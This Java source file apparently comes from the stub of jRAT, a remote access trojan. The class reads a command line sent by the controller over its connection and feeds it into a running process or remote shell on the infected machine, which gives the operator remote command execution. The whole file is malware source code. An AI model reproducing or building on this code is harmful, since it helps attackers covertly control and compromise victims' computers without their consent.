package se.jrat.stub.packets.incoming;

import java.io.PrintWriter;

import se.jrat.stub.Connection;
import se.jrat.stub.LaunchProcess;
import se.jrat.stub.RemoteShell;


public class Packet25RemoteShellExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String line = con.readLine();

		if (LaunchProcess.getLatest() != null) {
			PrintWriter input = new PrintWriter(LaunchProcess.getLatest().getProcess().getOutputStream(), true);
			input.println(line);
		} else if (RemoteShell.getInstance() != null) {
			PrintWriter input = new PrintWriter(RemoteShell.getInstance().getOutputStream(), true);
			input.println(line);
		}
	}

}
